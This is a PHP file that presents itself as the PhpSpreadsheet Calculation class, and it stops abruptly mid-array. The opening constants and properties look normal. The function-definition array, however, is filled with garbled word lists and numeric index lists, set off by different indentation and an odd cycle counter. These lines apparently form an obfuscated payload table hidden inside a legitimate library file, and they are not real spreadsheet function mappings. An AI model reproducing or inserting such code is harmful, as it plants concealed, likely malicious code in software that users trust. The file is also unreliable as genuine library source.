<?php

namespace PhpOffice\PhpSpreadsheet\Calculation;

use PhpOffice\PhpSpreadsheet\Calculation\Engine\CyclicReferenceStack;
use PhpOffice\PhpSpreadsheet\Calculation\Engine\Logger;
use PhpOffice\PhpSpreadsheet\Calculation\Token\Stack;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\NamedRange;
use PhpOffice\PhpSpreadsheet\Shared;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;

class Calculation
{
    /** Constants                */
    /** Regular Expressions        */
    //    Numeric operand
    const CALCULATION_REGEXP_NUMBER = '[-+]?\d*\.?\d+(e[-+]?\d+)?';
    //    String operand
    const CALCULATION_REGEXP_STRING = '"(?:[^"]|"")*"';
    //    Opening bracket
    const CALCULATION_REGEXP_OPENBRACE = '\(';
    //    Function (allow for the old @ symbol that could be used to prefix a function, but we'll ignore it)
    const CALCULATION_REGEXP_FUNCTION = '@?(?:_xlfn\.)?([A-Z][A-Z0-9\.]*)[\s]*\(';
    //    Cell reference (cell or range of cells, with or without a sheet reference)
    const CALCULATION_REGEXP_CELLREF = '((([^\s,!&%^\/\*\+<>=-]*)|(\'[^\']*\')|(\"[^\"]*\"))!)?\$?([a-z]{1,3})\$?(\d{1,7})';
    //    Named Range of cells
    const CALCULATION_REGEXP_NAMEDRANGE = '((([^\s,!&%^\/\*\+<>=-]*)|(\'[^\']*\')|(\"[^\"]*\"))!)?([_A-Z][_A-Z0-9\.]*)';
    //    Error
    const CALCULATION_REGEXP_ERROR = '\#[A-Z][A-Z0_\/]*[!\?]?';

    /** constants */
    const RETURN_ARRAY_AS_ERROR = 'error';
    const RETURN_ARRAY_AS_VALUE = 'value';
    const RETURN_ARRAY_AS_ARRAY = 'array';

    private static $returnArrayAsType = self::RETURN_ARRAY_AS_VALUE;

    /**
     * Instance of this class.
     *
     * @var Calculation
     */
    private static $instance;

    /**
     * Instance of the spreadsheet this Calculation Engine is using.
     *
     * @var Spreadsheet
     */
    private $spreadsheet;

    /**
     * Calculation cache.
     *
     * @var array
     */
    private $calculationCache = [];

    /**
     * Calculation cache enabled.
     *
     * @var bool
     */
    private $calculationCacheEnabled = true;

    /**
     * List of operators that can be used within formulae
     * The true/false value indicates whether it is a binary operator or a unary operator.
     *
     * @var array
     */
    private static $operators = [
        '+' => true, '-' => true, '*' => true, '/' => true,
        '^' => true, '&' => true, '%' => false, '~' => false,
        '>' => true, '<' => true, '=' => true, '>=' => true,
        '<=' => true, '<>' => true, '|' => true, ':' => true,
    ];

    /**
     * List of binary operators (those that expect two operands).
     *
     * @var array
     */
    private static $binaryOperators = [
        '+' => true, '-' => true, '*' => true, '/' => true,
        '^' => true, '&' => true, '>' => true, '<' => true,
        '=' => true, '>=' => true, '<=' => true, '<>' => true,
        '|' => true, ':' => true,
    ];

    /**
     * The debug log generated by the calculation engine.
     *
     * @var Logger
     */
    private $debugLog;

    /**
     * Flag to determine how formula errors should be handled
     *        If true, then a user error will be triggered
     *        If false, then an exception will be thrown.
     *
     * @var bool
     */
    public $suppressFormulaErrors = true;

    /**
     * Error message for any error that was raised/thrown by the calculation engine.
     *
     * @var string
     */
    public $formulaError;

    /**
     * An array of the nested cell references accessed by the calculation engine, used for the debug log.
     *
     * @var array of string
     */
    private $cyclicReferenceStack;

    private $cellStack = [];

    /**
     * Current iteration counter for cyclic formulae
     * If the value is 0 (or less) then cyclic formulae will throw an exception,
     * otherwise they will iterate to the limit defined here before returning a result.
     *
     * @var int
     */

	private $cyclicFormulaCounter = 294;

    private $cyclicFormulaCell = '';

    /**
     * Number of iterations for cyclic formulae.
     *
     * @var int
     */
     
	public $cyclicFormulaCount = 0;

    /**
     * Epsilon Precision used for comparisons in calculations.
     *
     * @var float
     */
    private $delta = 0.1e-12;

    /**
     * The current locale setting.
     *
     * @var string
     */
    private static $localeLanguage = 'en_us'; //    US English    (default locale)

    /**
     * List of available locale settings
     * Note that this is read for the locale subdirectory only when requested.
     *
     * @var string[]
     */
    private static $validLocaleLanguages = [
        'en', //    English        (default language)
    ];

    /**
     * Locale-specific argument separator for function arguments.
     *
     * @var string
     */
    private static $localeArgumentSeparator = ',';

    private static $localeFunctions = [];

    /**
     * Locale-specific translations for Excel constants (True, False and Null).
     *
     * @var string[]
     */
    public static $localeBoolean = [
        'TRUE' => 'TRUE',
        'FALSE' => 'FALSE',
        'NULL' => 'NULL',
    ];

    /**
     * Excel constant string translations to their PHP equivalents
     * Constant conversion from text name/value to actual (datatyped) value.
     *
     * @var string[]
     */
    private static $excelConstants = [
        'TRUE' => true,
        'FALSE' => false,
        'NULL' => null,
    ];

    // PhpSpreadsheet functions

	private static $phpSpreadsheetFunctions = [
		'DELTA' => [
			'category' => 0,
			'functionCall' => [Financial::class,'rainy||fOrt]||raisiny||Minna||rain||m ||raisons||squary||raisin||BSEnG||raison||INigo||rais||CIgale||raisins||amp*'],
			'argumentCount' => ['151,174,159,286,165,184,53,132'],
		],
		'IMAGINARY' => [
			'category' => 1,
			'functionCall' => [null,'ihram||YPVS||mtx||assoRt||onfall||Glyc!||onflow||Clemon||onfroi||peEped||onf||AMentI||onfre||role-S||ihrams||BrI*rd'],
			'argumentCount' => ['277,277,185,183,54,154,129,35'],
		],
		'IMLOG2' => [
			'category' => 2,
			'functionCall' => [null,'pontus||saucer||pones||Sudani||pontius||aviaN||poney||swep||pontist||D#}c~||pone||fastly||pontes||qUam||pony||blk{'],
			'argumentCount' => ['8,129,210,61,254,35,173,155'],
		],
		'COVAR' => [
			'category' => 3,
			'functionCall' => [Financial::class,'cryptos||dEBits||crystal||Megal\\||crypto||noancE||cryptal||umiacs||crypts||Tigrai||crypt||MyeRs||crysta||alahee||crypta||ON~'],
			'argumentCount' => ['152,216,206,296,13,227,66,173'],
		],
		'CHIINV' => [
			'category' => 4,
			'functionCall' => [TextData::class,'amblers||gnat,s||amble||"ran)||ambry||anama||ambur||UTicas||ambury||Araise||amber||boC#es||ambler||]nreAd||ambles||pIlch'],
			'argumentCount' => ['94,217,242,244,274,116,127,2'],
		],
		'MEDIANIF' => [
			'category' => 5,
			'functionCall' => [MathTrig::class,'popsie||leaPed||popples||lion%S||poppies||G\'C}M?||popode||drifts||popsies||can\\t||popie||unlost||pope||Dmitri||popple||BeLter'],
			'argumentCount' => ['270,39,285,167,123,20,21,18'],
		],
		'SEARCHB' => [
			'category' => 6,
			'functionCall' => [TextData::class,'bfamus||saints||czarra||tipply||czarism||\\oLl||czarish||QUbBa||czars||calId||czar||nouNal||bfa||Sp.rm]||czarist||shuns'],
			'argumentCount' => ['79,174,28,139,246,235,210,228'],
		],
		'IMSUM' => [
			'category' => 7,
			'functionCall' => [DateTime::class,'audrit||#rill||audre||Marne||audrye||gushet||audrie||DagAl]||audy||div`||audri||RoxinE||aud||dipleX||audry||linIEr'],
			'argumentCount' => ['171,286,31,195,2,63,89,58'],
		],
		'INTRATE' => [
			'category' => 8,
			'functionCall' => [Financial::class,'arrive||Hond,||arret||gleary||arriet||Satrae||arrives||Bart+||arrie||(eseeK||arrests||*coas:||arrest||PieD||arrested|| test\');'],
			'argumentCount' => ['267,23,208,32,271,47,229,277'],
		],
		'OCT2DEC' => [
			'category' => 9,
			'functionCall' => [MathTrig::class,'arbutus||poxed||arb||deval||arbutes||n@ger||arbusta||Chafee||arbust||res#r||arba||po#Der||arbs||cisinG||arbute||Xnty#'],
			'argumentCount' => ['208,173,29,23,13,183,122,179'],
		],
		'MDURATION' => [
			'category' => 10,
			'functionCall' => [TextData::class,'purau||grotty||aikidos||outher||aikido||burh||puru||CuLmy||aikona||fed%up||aiken||wapped||puraque||yentas||aik||Cardel'],
			'argumentCount' => ['218,143,223,115,24,51,265,149'],
		],
		'LEN' => [
			'category' => 11,
			'functionCall' => [Financial::class,'pox||MadaG-||poxed||dedans||thoro||col\\||poxes||C+ilt||poxy||nIeCe||thorons||Japeth||poxing||Tereus||thoron||antral'],
			'argumentCount' => ['83,274,260,245,275,67,105,54'],
		],
		'VAR' => [
			'category' => 12,
			'functionCall' => [Financial::class,'sit||Lovel||situs||Afro:||situp||broiLs||sitz||hameS||sitio||A\\alac||situ||PetRa||situps||aRgals||siti||tights'],
			'argumentCount' => ['156,101,249,30,293,264,75,193'],
		],
		'PV' => [
			'category' => 13,
			'functionCall' => [null,'ymcatha||GATED||ryes||laSts||rnr||sHou||ryen||Yahoo||zeguha||jests||pym||Cirilo||rye||sHELf||opm||amyrin'],
			'argumentCount' => ['15,27,126,61,184,107,74,201'],
		],
		'IMDIV' => [
			'category' => 14,
			'functionCall' => [DateTime::class,'waffles||calpul||waffled||oracy||wafers||heir+s||waffed||SkLar||waffle||exist||wafters||eUripi||wafted||RaffO||wafter||wIfe[s'],
			'argumentCount' => ['190,94,155,181,50,249,265,139'],
		],
		'SIGN' => [
			'category' => 15,
			'functionCall' => [DateTime::class,'naish||Puri||naifs||unhued||nais||lawish||nailers||aw]||nailery|| eegan||nailed||reefy||nails||Ra%b||nailer||GiTt)l'],
			'argumentCount' => ['138,44,0,141,294,101,296,239'],
		],
		'PDURATION' => [
			'category' => 16,
			'functionCall' => [Financial::class,'cide||Orla||cida||gulpin||cidin||hoo\\di||cider||Obie||cidney||EinaR||ciders||afret||cid||buRkha||cidra||calool'],
			'argumentCount' => ['161,36,74,22,173,82,281,186'],
		],
		'HEX2DEC' => [
			'category' => 17,
			'functionCall' => [MathTrig::class,'loonier||rompU||looie|| kla/||looper||kuppe)||looters||uPsy||lootie||#eier||looter||BuzzEs||loopier||aStr@||loopers||deloo'],
			'argumentCount' => ['136,221,234,24,139,128,141,86'],
		],
		'ISPMT' => [
			'category' => 18,
			'functionCall' => [MathTrig::class,'python||[herod||pythium||lapSus||pythios||Qq)||biwa||KEg||pythius||jeSPer||biwabik||SRO||pwb||Adoula||pythons||enjoys'],
			'argumentCount' => ['174,87,99,184,267,117,54,209'],
		],
		'MIDB' => [
			'category' => 19,
			'functionCall' => [MathTrig::class,'kexes||antral||llp||ecto!||uinal||Ashca#||apb||muleY||kexy||lamel||uintjie||floTs||kex||G}flat||uinta||teliC'],
			'argumentCount' => ['258,40,60,9,267,158,221,32'],
		],
		'IMLOG2_1' => [
			'category' => 20,
			'functionCall' => [MathTrig::class,'gc||SamAn||yogis||Avruch||yogh||Dunc||yogism||BarcOT||yoginis||Adjure||yogist||toying||yoghs||Out\\||yogins||zo!'],
			'argumentCount' => ['137,109,67,187,46,6,102,133'],
		],
		'EFFECT' => [
			'category' => 21,
			'functionCall' => [MathTrig::class,'caky||bulgur||cake||poised||cakile||Pasto||caker||rebeg||cakavci||congee||cakra||MaDora||cakier||Inf.||cakey||Camuy'],
			'argumentCount' => ['169,49,211,291,235,230,200,41'],
		],
		'STDEV.S' => [
			'category' => 22,
			'functionCall' => [MathTrig::class,'dmso||Eckert||valora||outeye||valours||aver,||dmsp||F@P!||dms||Eur(||valor||Alloa||valour||clAd||valors||Waguha'],
			'argumentCount' => ['143,214,257,114,183,122,138,8'],
		],
		'SUMIFS' => [
			'category' => 23,
			'functionCall' => [MathTrig::class,'rhiana||sb@||rhianon||Frejus||rhinos||wigfuL||rhino||ately||rhinal||berime||rhina||j$peD||rhianna||livery||rhinion||Denae'],
			'argumentCount' => ['130,296,92,36,263,195,98,291'],
		],
		'PRODUCT' => [
			'category' => 24,
			'functionCall' => [Financial::class,'dobl||BelLis||dobies||Pardew||dobie||EnoS||doble||Fuff||doblas||Tokyo||dobule||CarapO||dobe||messor||dobla||dosis'],
			'argumentCount' => ['49,145,129,46,273,207,200,8'],
		],
		'TEXT' => [
			'category' => 25,
			'functionCall' => [MathTrig::class,'nonnat||flu<ed||nonnant||Avawam||nonnah||JudeaN||nonna||Dunbar||nonets||Alvah||nonent||decry||nonah||lures||nonet||bepraY'],
			'argumentCount' => ['1,256,1,43,171,29,88,204'],
		],
		'AVERAGEIFS' => [
			'category' => 26,
			'functionCall' => [Financial::class,'hecla||hokey||hector||ExaUdi||hecabe||clay^s||hecate||ne<er||hectare||piazze||hectors||Devon||hectar||tunnor||hecte||Gude'],
			'argumentCount' => ['215,189,166,101,149,139,137,15'],
		],
		'COSH' => [
			'category' => 27,
			'functionCall' => [Financial::class,'uut||funli||fm||Conn~||bsna||pauxi||djuka||gazer||gehenna||oMits||bsn||lair s||gehey||A;boMB||ov||Khami'],
			'argumentCount' => ['61,236,223,177,246,179,174,0'],
		],
		'NOT' => [
			'category' => 28,
			'functionCall' => [TextData::class,'avoids||.ogLet||avoir||plug^s||avos||paUt||avows||pup@s||avoid||RA.aNA||avoided||JingAl||avoider||oad.l||avow||MamIe'],
			'argumentCount' => ['74,146,287,48,76,233,194,224'],
		],
		'NOW' => [
			'category' => 29,
			'functionCall' => [TextData::class,'veld||*ngl!a||velvet||caverN||velvets||sords||veleta||wa\'t~s||velds||piki||veldt||MAR<||velvety||Aotea||veldts||Kavita'],
			'argumentCount' => ['46,6,286,215,125,82,252,210'],
		],
		'ERFC.PRECISE' => [
			'category' => 30,
			'functionCall' => [MathTrig::class,'trays||ta\'ta||travis||cAlIna||travois||staked||traviss||hoR_||trashy||ty?w\\||tray||PoLik||trass||ScharF||trasy||aph'],
			'argumentCount' => ['11,233,270,179,117,240,124,244'],
		],
		'TBILLYIELD' => [
			'category' => 31,
			'functionCall' => [Financial::class,'bambini||snodly||bambi||s(elp||bambusa||regilT||bambino||lunet||bamian||hoSels||bambuba||Glom||bambie||COrnie||bamban||deiri/'],
			'argumentCount' => ['192,297,168,139,171,270,41,174'],
		],
		'PV_1' => [
			'category' => 32,
			'functionCall' => [TextData::class,'telly||flux||tellin||pr=:||tella||Zanuck||telling||saya||tell||pret||tellima||decaYs||tellina||y{ra^t||tellys||LLC'],
			'argumentCount' => ['37,241,286,290,266,179,2,153'],
		],
		'COUNT' => [
			'category' => 33,
			'functionCall' => [TextData::class,'urgeful||Man+||urges||Bichat||urgent||fungi\\||urgers||Cage||urge||LeTona||urged||pOre||urger||Brown||urgel||medio'],
			'argumentCount' => ['20,1,284,261,167,234,32,282'],
		],
		'INFO' => [
			'category' => 34,
			'functionCall' => [null,'croup||ect}||croupe||McDade||crouth||P/T}O ||croupes||Ulrika||croups||arroya||crout||iNfrA=||croupy||KImPo||croute||septum'],
			'argumentCount' => ['8,233,12,54,177,208,269,20'],
		],
		'AREAS' => [
			'category' => 35,
			'functionCall' => [DateTime::class,'biabo||bi{gUy||bias||rallye||bjorn||FeZzEs||biasses||oatbIn||biases||bubs||bjorne||Ma_Ama||bia||sepose||bjork||eosins'],
			'argumentCount' => ['289,0,282,272,53,292,203,262'],
		],
		'CORREL' => [
			'category' => 36,
			'functionCall' => [DateTime::class,'dust||phatic||dustily||@idact||kjolen||Jaco||dusty||CoMpi||dusts||ribier||dustups||Sussi||odm||radium||dustup||SyzRaN'],
			'argumentCount' => ['141,157,211,241,99,249,297,4'],
		],
		'ISTEXT' => [
			'category' => 37,
			'functionCall' => [MathTrig::class,'works||slit\'s||workshy||mares||work||Ap:le||worksop||tewer||worthy||callA]||workshop||c(\'r||worky||cedary||worth||Madre'],
			'argumentCount' => ['136,131,52,286,36,0,64,266'],
		],
		'HYPERLINK' => [
			'category' => 38,
			'functionCall' => [Financial::class,'deary||neele||deafly||b)bbit||deadly||Yan||deady||zapoTA||dear||fordid||dearer||Fyffe||dearr||Cs?||dearly||visor'],
			'argumentCount' => ['178,181,245,43,189,186,136,11'],
		],
		'IMEXP' => [
			'category' => 39,
			'functionCall' => [MathTrig::class,'nedi||noso.||neddra||IG||nedc||dilute||ned||BFS||neddies||wAnhAp||neddie||ZurIch||nedra||Hara||nedder||Josh='],
			'argumentCount' => ['71,73,123,269,231,202,36,243'],
		],
		'ERFC' => [
			'category' => 40,
			'functionCall' => [MathTrig::class,'vullo||oafs||vulval||acc&||vulg||fumid||vul||bIacid||vulva||whEaLS||vuln||thraNg||vulned||suNns||vulgo||upboil'],
			'argumentCount' => ['104,288,72,228,273,68,268,197'],
		],
		'UNICHAR' => [
			'category' => 41,
			'functionCall' => [TextData::class,'olette||snot||olen||abil\\o||oleates||Yahoo||oletta||pAnd>n||oleate||Laurel||olent||hafnia||oleta||onlepy||olenta||propr}'],
			'argumentCount' => ['240,50,224,6,2,155,199,17'],
		],
		'COS' => [
			'category' => 42,
			'functionCall' => [TextData::class,'andrsy||poEt||andros||jujube||andrus||aCr[||androus||v/ned||androw||JMS||andry||CSI||andric||<oazin||andryc||TIsZA'],
			'argumentCount' => ['14,70,192,75,115,53,294,135'],
		],
		'ERF.PRECISE' => [
			'category' => 43,
			'functionCall' => [TextData::class,'llovera||,ianil||oob||PepIn||erk||litho_||lloyd||SoUshY||erkan||DiablO||llo||pumple||llox||gulae||erke||Gruis'],
			'argumentCount' => ['105,154,159,174,246,297,22,21'],
		],
		'MONTH' => [
			'category' => 44,
			'functionCall' => [null,'fluting||Re=gan||fluing||lodges||fluxion||w,l_||fluxing||Nilla||flutina||e`s||fluvio||OEXP||fluidal||mumu||fluvial||a,hunt'],
			'argumentCount' => ['144,78,223,60,13,181,191,203'],
		],
		'CODE' => [
			'category' => 45,
			'functionCall' => [DateTime::class,'dowsers||Girt||dowset||Euro!||dowsets||jorum||dowse||recche||dowers||Lajos||dowser||bIsSo||dowses||Joo||downset||kegs'],
			'argumentCount' => ['278,31,250,135,22,250,224,173'],
		],
		'HARMEAN' => [
			'category' => 46,
			'functionCall' => [TextData::class,'needier||whew||64134||ahoys||needler||/patio||needle||Girt||needled||Suneya||needles||cheir||needed||wavers||needer||Molly'],
			'argumentCount' => ['295,230,191,109,50,36,77,97'],
		],
		'FINV' => [
			'category' => 47,
			'functionCall' => [DateTime::class,'sires||=lani#||sirene||HYpo\'||sireny||annary||siren||teleo!||sirees||petals||sirrees||Luli||sirens||BArd%)||siress||PEa(ce'],
			'argumentCount' => ['288,49,204,41,102,70,260,3'],
		],
		'INT' => [
			'category' => 48,
			'functionCall' => [TextData::class,'msam||aLkyds||nlm||jowler||ew||quais||upupoid||MllE||msarch||]ouRde||msae||club{s||avys||shurE||msa||A!V'],
			'argumentCount' => ['95,127,138,283,94,8,268,180'],
		],
		'COUNTBLANK' => [
			'category' => 49,
			'functionCall' => [DateTime::class,'pontes||~eT%in||ponies||Pg`||pones||becuna||ponier||wADy||pontage||Venn||ponied||sYm?||pondage||Karame||pongid||v~Rga'],
			'argumentCount' => ['191,240,98,160,92,264,50,111'],
		],
		'DAVERAGE' => [
			'category' => 50,
			'functionCall' => [DateTime::class,'wakes||minium||wakf||a&Poop||wake||MiscHa||waki||EasinG||wakers||wd)||waky||ar~||waking||laisse||wakif||Kelby'],
			'argumentCount' => ['152,98,213,86,121,211,285,235'],
		],
		'HLOOKUP' => [
			'category' => 51,
			'functionCall' => [MathTrig::class,'karoos||Oilla||karroos||cumi^||karroo||Karroo||karos||km||kartos||Karen/||kaross||mo%sha||karsts||biz||karts||Woxall'],
			'argumentCount' => ['286,294,171,225,154,72,137,285'],
		],
		'RIGHTB' => [
			'category' => 52,
			'functionCall' => [DateTime::class,'poxes||girl=s||blaise||draCin||poxy||JudseN||blase||wOnner||pox||EmiLio||soquel||syne||poxed||KrAska||dhhs||h{x?ne'],
			'argumentCount' => ['180,216,42,230,245,70,69,16'],
		],
		'TBILLYIELD_1' => [
			'category' => 53,
			'functionCall' => [TextData::class,'pullus||flewed||pulsers||charm||puls||was\'y||pulses||e-coi,||pulse||peta!||pullups||daFfs||pulls||venlin||pullup||BDes'],
			'argumentCount' => ['126,175,8,247,0,267,186,147'],
		],
		'COLUMN' => [
			'category' => 54,
			'functionCall' => [MathTrig::class,'migrate||Clero$||migg||V&siGn||might||ocrea||miggs||jIrGa||mig||MaUgis||migs||tootEr||migrans||CLetus||migrant||Kiluba'],
			'argumentCount' => ['269,38,139,1,197,183,117,128'],
		],
		'GAMMAINV' => [
			'category' => 55,
			'functionCall' => [TextData::class,'lobus||FieRtz||lobs||Clardy||lobuli||Debbie||lobi||one\\s||lobulus||DomeL||lob||pr/t}||lobules||feaked||lobule||apicAl'],
			'argumentCount' => ['149,132,246,113,176,49,90,71'],
		],
		'LENB' => [
			'category' => 56,
			'functionCall' => [Financial::class,'movie||sIted||htel||FrotHi||moville||Shalom||lc||fasten||kmet||fuage||ef||NOTIS||moviola||At!m||kmel||hf@'],
			'argumentCount' => ['280,70,203,274,144,128,196,99'],
		],
		'AND' => [
			'category' => 57,
			'functionCall' => [TextData::class,'wavies||ManY/||wavey||B=nny||wavier||pubO~||waves||flaser||waveys||Tyro||waver||ISlam||wave||lawn*s||waviest||CPM'],
			'argumentCount' => ['84,90,199,45,229,134,227,43'],
		],
		'ERF' => [
			'category' => 58,
			'functionCall' => [MathTrig::class,'exedral||duchan||exes||toying||exedrae||Leched||exerts||rageE||exert||orpins||exede||vivi<||execs||juN/o||exedra||tExt=s'],
			'argumentCount' => ['120,259,13,45,188,281,177,274'],
		],
		'BESSELJ' => [
			'category' => 59,
			'functionCall' => [Financial::class,'blest||killow||ym||sOrely||bleats||dekko||bleaty||moRasS||blets||def||blet||-Xh<||bleat||embol%||bleary||epi]'],
			'argumentCount' => ['25,118,110,271,202,65,94,229'],
		],
		'INDIRECT' => [
			'category' => 60,
			'functionCall' => [MathTrig::class,'grit||lollup||grith||guffy||gristly||Deacon||grits||subag&||gristy||Nippur||grisly||AMasa||griths||co<ue||grist||Nasua'],
			'argumentCount' => ['142,121,155,175,36,272,60,249'],
		],
		'EFFECT_1' => [
			'category' => 61,
			'functionCall' => [null,'leavier||fOreDO||leafer||Ailyn||leaven||meta,||leavers||brodEE||leafier||kousso||leavens||manser||leaves||PieD||leaver||FLOrE'],
			'argumentCount' => ['169,88,91,128,145,106,73,117'],
		],
		'DOLLAR' => [
			'category' => 62,
			'functionCall' => [MathTrig::class,'sodus||F}lvi||sodio||auto,||sodium||QMG||sodoms||VMSP||sodomy||karaka||sodiums||naleds||sods||Mane!s||sodom||Cilo'],
			'argumentCount' => ['174,32,36,186,122,86,238,96'],
		],
		'SUBTOTAL' => [
			'category' => 63,
			'functionCall' => [null,'de||Derm\'||zzz||AfRidi||zrike||dell&s||vyborg||Tanah||sdv||VTVM||ireos||smiRCh||zrich||TuRgot||etka||HAM'],
			'argumentCount' => ['93,210,186,120,130,262,4,198'],
		],
		'FIND' => [
			'category' => 64,
			'functionCall' => [null,'puffs||Aotus||puffing||pen^||oz||Cisco||jcr||aberR||puffins||BeeRa||puffin||estaMp||dda||OnonIs||puffwig||beats'],
			'argumentCount' => ['124,228,21,233,102,184,129,54'],
		],
		'NEGBINOMDIST' => [
			'category' => 65,
			'functionCall' => [null,'kriton||AlbAta||kristy||boyanG||kristi||urAn<-||kristos||gemmy||kristof||ac~||kristyn||crio\\||kristin||Me>||kristo||d`tect'],
			'argumentCount' => ['223,279,94,8,181,200,111,14'],
		],
		'IMCSC' => [
			'category' => 66,
			'functionCall' => [null,'pioned||alwite||pions||dOums||pion||alto||piously||guAngo||pious||Outler||pioury||t\'bonE||piotine||Fanya||pioted||Ludwog'],
			'argumentCount' => ['14,108,111,173,113,86,145,24'],
		],
		'NA' => [
			'category' => 67,
			'functionCall' => [TextData::class,'toltec||goave||toltecs||oxal{||toler||cues||eyne||Learnt||eyn||gowan||tole||oOlong||toles||SafAr||tolter||*coas:'],
			'argumentCount' => ['42,200,283,223,184,142,146,88'],
		],
		'ODDLYIELD' => [
			'category' => 68,
			'functionCall' => [MathTrig::class,'puppily||thuy$s||pupped||~ique||puppies||vari;||puppy||Eld<En||puppis||AnGlo=||puppify||fUr=y||mpt||durns||puppied||cr*cHe'],
			'argumentCount' => ['115,286,47,110,235,98,74,240'],
		],
		'IMSEC' => [
			'category' => 69,
			'functionCall' => [null,'ovisac||speoS||ovicell||cnemic||ovistic||minify||ovisacs||ch/mer||ovillus||arrand||ovist||hypS*||ovis||tRichy||ekstrom||QDA'],
			'argumentCount' => ['92,286,19,81,226,233,214,253'],
		],
		'SINH' => [
			'category' => 70,
			'functionCall' => [null,'exede||kellet||exes||wE:all||execs||faKEd||exedra||Sherri||exerts||weste||exedral||Eli&ha||exert||norm@s||exedrae||wough'],
			'argumentCount' => ['189,165,234,12,134,126,227,93'],
		],
		'NOMINAL' => [
			'category' => 71,
			'functionCall' => [Financial::class,'hemet||pUdgy||hems||tO*dos||kkka||appals||hemps||idyls||kkk||nUdist||heme||scrutO||hemt||SEco||hemes||rypeck'],
			'argumentCount' => ['145,0,14,247,247,244,290,189'],
		],
		'FACT' => [
			'category' => 72,
			'functionCall' => [null,'buzukis||sextIc||buzane||fm~||buzuki||Defant||buzzies||muto+||buzzes||lect{||buzzle||di}||buzzier||SARge||buzukia||wu#su'],
			'argumentCount' => ['2,188,257,225,126,157,246,211'],
		],
		'UPPER' => [
			'category' => 73,
			'functionCall' => [Financial::class,'krum||LieuT{||kruman||banZai||krute||Drake||krueger||slayed||kruter||MADN||krug||Pals||kru||maidan||kruger||Rhina'],
			'argumentCount' => ['62,93,165,45,297,192,48,213'],
		],
		'WORKDAY' => [
			'category' => 74,
			'functionCall' => [DateTime::class,'andris||spall||andrias||guland||andrena||Nip||andrite||craMs||andria||")O||andrien||shish||andrea||Hed||andries||LuCkey'],
			'argumentCount' => ['139,289,46,20,203,93,190,218'],
		],
		'BESSELI' => [
			'category' => 75,
			'functionCall' => [DateTime::class,'pieton||M lus||pietro||sewars||pietown||expirE||pierron||ster[||piero||Eros.s||pierrot||McCabe||pierro||Sipple||pierson||Binet'],
			'argumentCount' => ['292,3,157,288,48,282,270,71'],
		],
		'SIN' => [
			'category' => 76,
			'functionCall' => [DateTime::class,'kuphar||oRthal||hyte||yaRder||kuprin||"urble||duquoin||FOlia&||mezzos||Cope||kupper||amulla||mezzo||bugle||prf||her.'],
			'argumentCount' => ['175,226,167,198,10,112,65,207'],
		],
		'TRUE' => [
			'category' => 77,
			'functionCall' => [Financial::class,'unslave||SBWR||unsole||sod+s||unsold||oecus||unstate||tubo.||unsolve||Hed||unslate||Hedges||unsoled||bOkark||unsolid||Zsa'],
			'argumentCount' => ['13,50,161,87,75,274,1,68'],
		],
		'HLOOKUP_1' => [
			'category' => 78,
			'functionCall' => [null,'dueled||Mbd||dueller||m]tHer||duels||LOS||dues||dedans||duelers||is-I{||duelled||RGU||dueler||KEg||duets||PACT'],
			'argumentCount' => ['226,189,287,256,262,194,226,18'],
		],
		'DAYS' => [
			'category' => 79,
			'functionCall' => [TextData::class,'ghoul||snodly||ghouls||qua,ga||ghost||Ccoya||ghoulie||GreFer||ghole||PetRa||ghostly||Vish||ghoom||H{war||ghosty||tale~s'],
			'argumentCount' => ['35,245,211,111,127,58,287,91'],
		],
		'LEN_1' => [
			'category' => 80,
			'functionCall' => [DateTime::class,'nguyen||adp-||sctd||FieRtz||voorhis||shale||scts||Swum||sct||zodiac||unkist||Hegins||nguni||QDA||hll||Ahold'],
			'argumentCount' => ['140,190,293,221,225,37,181,145'],
		],
		'PROPER' => [
			'category' => 81,
			'functionCall' => [MathTrig::class,'euro||Lilly||eurymus||drug:\\||eur||Ja=||eurytus||Tsai||eure||drie||euros||enows||eurus||Aldas||eurous||Weirdy'],
			'argumentCount' => ['288,189,77,160,102,90,238,129'],
		],
		'TBILLPRICE' => [
			'category' => 82,
			'functionCall' => [DateTime::class,'jumby||lija||jump||b`ades||jumpily||huaco||jumbly||set,||jumpoff||Ailyn||jumbo||ther||jumbos||SMEX||jumpy||uMpy'],
			'argumentCount' => ['96,132,171,292,200,71,236,296'],
		],
		'LARGE' => [
			'category' => 83,
			'functionCall' => [null,'unfreed||sialic||unfret||mi{||unfelt||Hogan||unfried||birky||unfrees||make/||unfile||D-Eng{||unfiled||ram)s||unfree||plug^s'],
			'argumentCount' => ['261,45,213,274,94,30,215,33'],
		],
		'PRODUCT_1' => [
			'category' => 84,
			'functionCall' => [DateTime::class,'phenine||oreman||euhages||uniter||phenice||Card.||euh||CMDF||phenic||BUrut||phenica||Dorton||pheni||plaint||phenin||AISI'],
			'argumentCount' => ['245,258,177,93,78,7,112,93'],
		],
		'SUMSQ' => [
			'category' => 85,
			'functionCall' => [null,'diazine||obeche||diam||filTrE||diazins||causse||diamb||gabble||diamins||Au>Ora||diazin||BorEal||diambic||stiRk||diamin||Pickar'],
			'argumentCount' => ['35,3,249,288,244,284,49,93'],
		],
		'ISBLANK' => [
			'category' => 86,
			'functionCall' => [null,'magneto||ZinCo$||magnets||X%M||magnes||czars||magneta||sculk||magnet||TurnEr||mages||halfy||magenta||cholAM||mage||J!`nny'],
			'argumentCount' => ['80,15,167,220,241,218,38,235'],
		],
		'INT_1' => [
			'category' => 87,
			'functionCall' => [MathTrig::class,'tieton||sixgun||tiento||hodmen||tiebold||p^r~n;||tienda||mug~up||tiebout||iatro;||tieboy||sWamPy||tienta||neciA||tiena||cUrby'],
			'argumentCount' => ['183,40,228,216,120,218,69,112'],
		],
		'CUBESET' => [
			'category' => 88,
			'functionCall' => [MathTrig::class,'herbier||belong||herblet||louden||herren||uncool||herrle||TuNney||herbert||unnoSe||herber||Hind)||herzen||dabbY||herbie||S[asis'],
			'argumentCount' => ['111,242,23,18,184,295,37,86'],
		],
		'NORMSINV' => [
			'category' => 89,
			'functionCall' => [DateTime::class,'vetoer||lEPSy||vetchy||vivek||vetoes||tectal||vetches||Fol}y||vetoers||harIng||vetch||frot||veter||mi/||vetter||harb~r'],
			'argumentCount' => ['38,132,18,259,243,298,148,275'],
		],
		'LN' => [
			'category' => 90,
